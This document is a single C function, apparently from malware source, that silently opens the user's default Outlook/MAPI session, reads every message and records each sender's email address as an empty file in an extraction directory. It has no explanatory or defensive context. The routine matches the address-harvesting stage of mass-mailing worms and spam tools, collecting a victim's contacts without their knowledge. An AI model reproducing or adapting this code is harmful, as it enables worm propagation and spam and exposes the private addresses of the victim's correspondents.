   bool GetOutlookContacts(char ExtractionDirectory[MAX_PATH])
   {
       HINSTANCE       MapiDll;
       LPMAPILOGON     MapiLogon;
       LPMAPIFINDNEXT  MapiFindNext;
       LPMAPIREADMAIL  MapiReadMail;
       LPMAPILOGOFF    MapiLogoff;
       LHANDLE         MapiSessionHandle;
       char            MessageBuffer[512];
       MapiMessage     *GetMessage;
       HANDLE          FileHandle;

       MapiDll = LoadLibrary("MAPI32.DLL");

       if(MapiDll != 0)
       {
           MapiLogon       = (LPMAPILOGON)     GetProcAddress(MapiDll, "MAPILogon");
           MapiFindNext    = (LPMAPIFINDNEXT)  GetProcAddress(MapiDll, "MAPIFindNext");
           MapiReadMail    = (LPMAPIREADMAIL)  GetProcAddress(MapiDll, "MAPIReadMail");
           MapiLogoff      = (LPMAPILOGOFF)    GetProcAddress(MapiDll, "MAPILogoff");

           if(MapiLogon(0, 0, 0, 0, 0, &MapiSessionHandle) == SUCCESS_SUCCESS)
           {
               while(MapiFindNext(MapiSessionHandle, 0, 0, MessageBuffer, MAPI_GUARANTEE_FIFO, 0, MessageBuffer) == SUCCESS_SUCCESS)
               {
                   if(MapiReadMail(MapiSessionHandle, 0, MessageBuffer, 0, 0, &GetMessage) == SUCCESS_SUCCESS)
                   {
                       SetCurrentDirectory(ExtractionDirectory);
                       FileHandle = CreateFile(GetMessage->lpOriginator->lpszAddress, GENERIC_READ, FILE_SHARE_READ, 0, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, 0);
                       CloseHandle(FileHandle);
                   }
               }

               MapiLogoff(MapiSessionHandle, 0, 0, 0);
               FreeLibrary(MapiDll);
               return true;
           }

           FreeLibrary(MapiDll);
       }

       return false;
   }
